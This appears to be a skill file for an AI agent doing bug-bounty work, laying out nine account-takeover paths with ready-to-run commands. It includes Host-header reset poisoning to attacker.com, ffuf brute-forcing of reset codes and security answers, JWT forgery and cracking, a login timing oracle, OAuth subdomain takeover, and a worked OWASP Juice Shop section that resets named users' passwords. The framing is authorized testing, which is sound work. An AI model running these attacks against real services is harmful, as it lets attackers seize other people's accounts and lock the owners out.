---
name: hunt-ato
description: "Hunt account takeover — 9 paths plus chains. Paths: (1) password-reset flaws (host-header poisoning, predictable/numeric token, Referer leak, no-expiry/reuse), (2) email change without re-auth, (3) OAuth account-link CSRF, (4) MFA bypass, (5) session fixation, (6) JWT manipulation (alg:none, RS256→HS256 key confusion, weak HMAC, kid injection), (7) password change without step-up + login timing/length oracle, (8) social-recovery / security-question brute-force, (9) SSO subdomain takeover at OAuth redirect_uri. Chains: cookie theft + oracle + no step-up = persistent ATO; lax redirect_uri or dangling-CNAME = auth-code theft. Validate by taking over a test account B from attacker A's session; OOB-confirm blind token-leak steps. Use when testing reset / email-change / MFA / OAuth / session / JWT flows or chaining toward Critical."
---

# HUNT-ATO — Account Takeover Taxonomy

> 9 distinct paths. ATO is a destination class, not a single bug — each path below is a primitive that becomes Critical only when you demonstrate takeover of a SECOND account (test account B) you do not control, from attacker A's session/IP/device. A path that only locks you out of your own account, or only works when you already hold the victim's password AND session, is not a standalone ATO.

### Path 1: Password Reset Poisoning (Host-Header)
```bash
POST /forgot-password HTTP/1.1
Host: attacker.com                 # primary Host swap
# OR keep real Host and add one of:
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
# OR dual-Host smuggling:  Host: target.com\r\nHost: attacker.com

email=victimB@company.com
```
The reset mailer builds the link from the request Host header → link points to `attacker.com/reset?token=XXXX`. **Confirmation = OOB, not response-based:** point the header at a Burp Collaborator / unique DNS name and read the actual email (use a controlled victim B inbox you own for the test). If the token only appears in the email body that lands at your Collaborator host, you have proof.
**False-positive killer:** many apps put `attacker.com` in the email but the actual link domain is server-pinned — read the email, do not infer from the reflected header.

### Path 2: Reset Token in Referer / Open-Redirect Leak
```
GET /reset-password?token=ABC123
→ page loads third-party resource: <script src="https://analytics.com/t.js">
→ browser sends  Referer: https://target.com/reset-password?token=ABC123
→ token exfiltrated to every off-origin host the page calls
```
Also test reset pages that 302 to an open redirect carrying the token in the URL. **Proof:** capture the outbound request in the Network tab (or Collaborator if you control the off-origin host) showing the full token in the Referer. Mitigated by `Referrer-Policy: no-referrer` + tokens in POST body — note their absence.

### Path 3: Predictable / Weak Reset Tokens
```bash
# 6-digit numeric OTP-style reset code, no rate limit:
ffuf -u "https://target.com/api/reset/verify" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","code":"FUZZ"}' \
  -w <(seq -w 000000 999999) -mc 200 -fr "invalid" -t 5
# time-based tokens: capture 5 tokens, diff — md5(timestamp)/sequential int = predictable
```
**Discipline:** request the victim-B token yourself (you own B), confirm entropy by sampling, THEN show a fresh brute lands. A rate-limit-only finding on `/forgot-password` is routinely rejected — the impact is token guessing, not request flooding.

### Path 4: Token No-Expiry / Reuse / Cross-Account
```
Expiry:  request token → wait 2h → still valid? = bug
Reuse:   use token once → use again → still valid? = bug
Multi:   request token#1, then token#2 → is token#1 still valid? (should be invalidated)
Cross:   does B's token reset A's password if you swap the userid/email param? = IDOR-in-reset
```

### Path 5: Email Change Without Re-Auth
```bash
PUT /api/user/email HTTP/1.1
Cookie: session=ATTACKER_A_SESSION
{"new_email":"attacker@evil.com"}     # no current_password, no OTP, no email-confirm
```
If the change takes effect with no current-password challenge and no confirm-link to the OLD address, trigger password reset → reset lands at attacker mailbox → ATO. The strongest variant skips even the new-address confirmation. Branded pattern: account-link / email-change → ATO via missing re-auth.

### Path 6: JWT Manipulation
```bash
# (a) alg:none — strip the signature, set header alg to none
python3 -c "import jwt; print(jwt.encode({'sub':'victimB','role':'admin'}, key='', algorithm='none'))"
# send: header {"alg":"none","typ":"JWT"}, payload {"sub":"victimB"}, empty signature
#
# (b) RS256 -> HS256 key confusion: re-sign with the server's PUBLIC key as the HMAC secret
curl -s https://target.com/.well-known/jwks.json   # or /oauth/.well-known/...  grab the RSA pub key
# convert JWK -> PEM, then sign HS256 using that PEM bytes as the secret -> server verifies it
#
# (c) weak HMAC secret: crack offline
hashcat -a 0 -m 16500 token.jwt rockyou.txt   # -m 16500 = JWT
#
# (d) kid injection: kid=../../../dev/null (empty key) or kid=' UNION SELECT 'secret -- (SQL-backed kid)
```
**Verified grounding for this class:** [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235) (node `jsonwebtoken` <4.2.2 — alg confusion / none bypass), [CVE-2016-10555](https://nvd.nist.gov/vuln/detail/CVE-2016-10555) (`jwt-simple` RS256→HS256). **Validate:** forged token must reach a privileged endpoint as victim B (e.g. `GET /api/admin` or `/api/users/B`) — decoding/forging is not impact; an authorized action under B's identity is. If the server ignores the forged `sub` and keys off the session cookie, the JWT is not the trust boundary — no finding.

### Path 7: Password Change Without Step-Up + Login Oracle
```bash
# (a) password-change endpoint accepts a new password with no current-password / no MFA challenge:
POST /api/account/password
Cookie: session=STOLEN_B_COOKIE        # from XSS, session-fixation, or token leak
{"new_password":"Pwned#2026"}          # no "current_password" field
#
# (b) login oracle to find a valid password without an existing cookie — measure response delta:
for p in $(cat candidates.txt); do
  t=$(curl -s -o /dev/null -w '%{time_total}' -d "user=victimB&pass=$p" https://target.com/login)
  printf '%s\t%s\n' "$t" "$p"
done | sort -n     # bcrypt-vs-fast-reject timing gap, or response-length diff, leaks valid pass
```
A no-step-up password-change endpoint is the **persistence multiplier**: cookie theft (transient) + this = attacker sets a new password from the stolen cookie → owns B from any device/IP, victim locked out. **False-positive check:** confirm there is genuinely no current-password / MFA gate — many APIs accept the field as optional but still 403 server-side; replay without the field and read the actual state change (try logging in with the new password from a clean browser).

### Path 8: Social-Recovery / Security-Question Abuse
```bash
# Security answers are low-entropy and often unthrottled. Brute the recovery-answer endpoint:
ffuf -u "https://target.com/account/recover/answer" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victimB@company.com","question":"pet","answer":"FUZZ"}' \
  -w common-answers.txt -mc 200 -fr "incorrect" -t 5
# also test: answers returned/echoed in /api/me or recovery page source (client-side check)
# and: question itself reveals PII the answer to which is OSINT-able (mother maiden, first school)
```
Pair with `offensive-osint`: many "secret" answers (birth city, pet, school) are public on social profiles → no brute needed. **Validate** by completing the recovery flow end-to-end into a session on account B.

#### P2 — Juice Shop: security-answer reset path (`POST /rest/user/security-answer`)
OWASP Juice Shop (`http://localhost:3000`, SQLite backend) resets a password by *answering that user's chosen security question*, not by emailing a token — so Path 8 IS the reset path here. The flow is two requests: read the user's security question, then submit `email + securityAnswer + new password + repeat` to `POST /rest/user/reset-password`. There is no rate limit and no email round-trip, so an OSINT'd or fuzzed answer = instant ATO.
```bash
# (1) discover WHICH question a user picked — auto-CRUD REST exposes the join table read-only:
curl -s "http://localhost:3000/api/SecurityAnswers/3"        # -> {"UserId":3,"SecurityQuestionId":2,...}
curl -s "http://localhost:3000/api/SecurityQuestions/2"      # -> {"question":"Mother's maiden name = ?"}
# (the answer hash is NOT returned — you must know/guess the plaintext)
#
# (2) complete the reset by answering it (this is the actual ATO request):
curl -s -X POST "http://localhost:3000/rest/user/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"email":"jim@juice-sh.op","answer":"Samuel","new":"pwned123","repeat":"pwned123"}'
# 200 + {"user":...} = password reset, account owned. 401/{"error":"..."} = wrong answer, retry.
```
**OSINT the truthful answer (external — go look it up):** Juice Shop seeds real questions whose answers are NOT in the DB response — they live in the lore. Point the hunter at the product/customer-feedback pages and the per-challenge hints:
- `jim@juice-sh.op` — *"Your eldest siblings middle name?"* → Jim is a Star Trek nod; the answer is **`Samuel`** (Bones/McCoy lore). Unlocks **"Reset Jim's Password"**.
- `bender@juice-sh.op` — *"Company you first worked for?"* → Futurama lore → **`Stop'n'Drop`**. Unlocks **"Reset Bender's Password"**.
- `bjoern@owasp.org` — *"Name of your favorite pet?"* → real-person OSINT (the maintainer's actual pet). Unlocks **"Reset Bjoern's OWASP Password"**; the internal `bjoern@juice-sh.op` account with the SAME pet answer unlocks **"Reset Bjoern's Password"** and is the basis for **"Bjoern's Favorite Pet"**.
*These three require external OSINT you cannot derive from the box — search the maintainer's public profiles / Juice Shop companion guide for the pet name before brute-forcing.*

**Answer-normalization & spelling-variant fuzzing** — the server compares the *bcrypt of the submitted string* against the stored hash, so casing/spacing/punctuation must match exactly. When you know the answer's *meaning* but not its exact stored form, fuzz variants against `/rest/user/reset-password`:
```bash
# generate variants of a known-meaning answer, then test each (no throttle):
printf '%s\n' "Samuel" "samuel" "SAMUEL" "Sam" " Samuel " "Samuel." "samuel mccoy" \
  | while read -r a; do
      code=$(curl -s -o /dev/null -w '%{http_code}' -X POST \
        "http://localhost:3000/rest/user/reset-password" -H "Content-Type: application/json" \
        -d "{\"email\":\"jim@juice-sh.op\",\"answer\":\"$a\",\"new\":\"pwned123\",\"repeat\":\"pwned123\"}")
      printf '%s\t%s\n' "$code" "$a"
    done   # 200 = the exact stored normalization
```
**"Historical-twist" transforms** — Juice Shop hides answers behind a thematic twist (Star Trek / Futurama / sci-fi), so when raw OSINT fails, transform the candidate: actor↔character name, full↔nickname, franchise alias, year/era substitution, in-universe spelling. Feed those transforms into the same variant loop.
**Pet-name wordlists** — for the "favorite pet" questions, brute a focused list rather than the OSINT path:
```bash
# common-pet-names.txt: Max Bella Charlie Lucy Cooper Daisy Rocky Buddy Molly Bailey Coco Toby ...
ffuf -u "http://localhost:3000/rest/user/reset-password" -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"bjoern@juice-sh.op","answer":"FUZZ","new":"pwned123","repeat":"pwned123"}' \
  -w common-pet-names.txt -mc 200 -fr "error" -t 5
```
**Juice Shop reality check:** route guards and the answer dropdown are Angular *client-side only* — you never touch the UI; hit `/rest/user/reset-password` directly. The `/api/SecurityAnswers` and `/api/SecurityQuestions` auto-CRUD endpoints leak which question maps to which user but NOT the hashed answer, so the win is always either OSINT or low-entropy brute, never reading the answer out. **Validate** by logging in with the new password (`POST /rest/user/login`) and confirming you hold a JWT for the victim.

### Path 9: SSO Subdomain Takeover at OAuth redirect_uri
```bash
# (a) enumerate accepted redirect_uri patterns — does the provider accept *.target.com subdomains?
GET /oauth/authorize?client_id=...&redirect_uri=https://anything.target.com/cb&response_type=code
# (b) find a dangling subdomain (CNAME -> deprovisioned Heroku/S3/Azure/GH-Pages) via hunt-subdomain:
dig +short staging.target.com    # CNAME -> nonexistent-app.herokuapp.com  (NXDOMAIN on the target)
# (c) claim that host on the cloud provider, serve a callback that logs the ?code=
# (d) send victim B the crafted authorize URL -> their code/token lands on your claimed subdomain
```
**Confirmation = OOB:** the auth `code` (or implicit `access_token`) must actually arrive at the host you claimed — log it server-side and exchange it for B's token. A redirect_uri that merely *reflects* an off-origin value but bounces the code through a server-pinned exchange is not exploitable. Decode any error body as JSON, not substring — `AADSTS50076` / claims-challenge responses contain a literal `access_token` substring inside the claims field that is NOT a usable token.

### ATO Severity Gate
- **Critical** — zero/low victim interaction: Host-header reset poisoning, JWT forgery to victim endpoint, lax-redirect_uri auth-code theft, IDOR-driven email change → reset.
- **High** — one email click OR a pre-existing session/cookie required (Referer leak, no-step-up password change behind cookie theft).
- **Medium** — requires phishing + active user interaction (OAuth-link CSRF needing the victim to click + be logged in).
- **Low** — attacker must be MitM, or only self-account impact.

---

## Related Skills & Chains

- **`hunt-idor`** — The most reliable ATO primitive that needs no email control and no race. Chain primitive: `PATCH /api/users/{victimB_uid}` with attacker-A session + victim UID + `{"email":"attacker@evil.com"}` → trigger password reset → reset email arrives at attacker → full ATO, zero victim interaction (Path 5 + IDOR = Critical).
- **`hunt-mfa-bypass`** — Path 7 is only Critical if it also bypasses MFA. Chain primitive: password-change endpoint accepts a new password with no current-password challenge AND no MFA step-up → cookie theft (XSS / token leak) + login timing oracle → set new password from the stolen cookie → MFA-less ATO from any IP/device.
- **`hunt-oauth`** — Path 9 lives here. Chain primitive: `redirect_uri` validation accepts subdomain match (`*.target.com`) + `hunt-subdomain` reveals a dangling CNAME on `staging.target.com` → claim it on Heroku/S3 → host an OAuth callback → victim clicks the crafted authorize URL → code lands on the attacker subdomain → exchange for token → ATO. Always JSON-parse OAuth error bodies; never substring-match `access_token`.
- **`hunt-api-misconfig`** — Path 6 (JWT) detail lives here too: alg:none, RS256→HS256 key confusion (sign with the JWKS public key as the HMAC secret), `kid` path-traversal / SQLi, and weak-secret cracking (`hashcat -m 16500`). Load it together with this skill for the JWK→PEM conversion mechanics.
- **`hunt-host-header`** — Path 1 canonical primitive. Chain primitive: `POST /forgot-password` with `Host`/`X-Forwarded-Host: attacker.com` → mailer builds the link from the request Host → link points to `attacker.com/reset?token=XXXX` → victim clicks → token leaked → ATO. Confirm via Collaborator-hosted domain reading the real email, not the reflected header.
- **`offensive-osint`** — Path 8 force-multiplier: most security-question answers (birth city, pet, first school, mother's maiden name) are OSINT-able from social profiles → recover account B with no brute force at all.
- **`security-arsenal`** — Pull the Password-Reset Bypass Tables (`X-Forwarded-Host`, `X-Host`, `X-HTTP-Host-Override`, dual-Host smuggling), token-entropy payloads (sequential numeric, time-based predictable), the JWT attack table, and the always-rejected list for "rate-limit on /forgot-password" reports.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an ATO that needs the victim to click a link AND enter credentials AND pass CAPTCHA. The reproducibility step (10-minute fresh-browser walkthrough taking over test account B from attacker A's session) separates Critical-paid from Self-XSS-tier rejected.
